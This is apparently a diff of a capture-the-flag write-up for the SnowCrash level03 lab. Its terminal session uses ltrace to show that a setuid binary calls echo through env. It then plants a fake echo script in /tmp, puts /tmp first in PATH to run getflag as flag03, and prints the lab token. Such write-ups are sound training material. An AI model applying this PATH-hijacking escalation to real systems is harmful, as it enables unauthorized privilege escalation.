@@ -1,5 +1,7 @@
 guest:
 
+Find level03 binary
+
 level03@SnowCrash:~$ ls -la
 total 24
 dr-x------ 1 level03 level03  120 Mar  5  2016 .
@@ -9,9 +11,13 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
 
+try to run it
+
 level03@SnowCrash:~$ ./level03
 Exploit me
 level03@SnowCrash:~$
+
+Use ltrace tool to trace the steps of a binary
 
 level03@SnowCrash:~$ ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
@@ -24,6 +30,8 @@ system("/usr/bin/env echo Exploit me"Exploit me
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                            = 0
 +++ exited (status 0) +++
+
+As far as the echo command is run by flag03 user we need to create custom echo and add its location to $PATH
 
 level03@SnowCrash:~$ echo "getflag" > /tmp/echo
 
@@ -39,7 +47,3 @@ level03@SnowCrash:~$ echo $PATH
 
 level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
-
-level03@SnowCrash:~$ su level04
-Password:
-level04@SnowCrash:~$
